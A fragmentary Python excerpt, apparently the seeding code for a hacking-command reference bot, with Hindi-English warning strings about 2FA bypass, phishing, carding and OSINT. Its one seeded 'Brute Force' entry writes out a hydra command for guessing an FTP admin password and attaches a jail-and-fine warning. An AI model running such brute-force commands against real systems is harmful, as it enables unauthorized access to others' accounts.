...
def seed_database() -> bool:
    ...
    try:
        ...
        WARNING_2FA = "🔴 2FA BYPASS — यह अवैध गतिविधि है।"
WARNING_PHISHING = "🔴 PHISHING — यह साइबर फ्रॉड है।"
WARNING_CARDING = "🔴 CARDING — यह financial fraud है।"
WARNING_OSINT = "⚠️ OSINT — केवल legal intelligence gathering के लिए। Stalking illegal है."
...
commands = [
    ...
    "/warnings",
            ...
            ('Brute Force',   'hydra -l admin -P pass.txt ftp://target.com', 'FTP brute', 'FTP brute', 'hydra -l admin -P pass.txt ftp://target.com', 'Enter', 'FTP password todna', '1', '3-7 saal jail + 10 lakh fine', 'WARNING_ILLEGAL')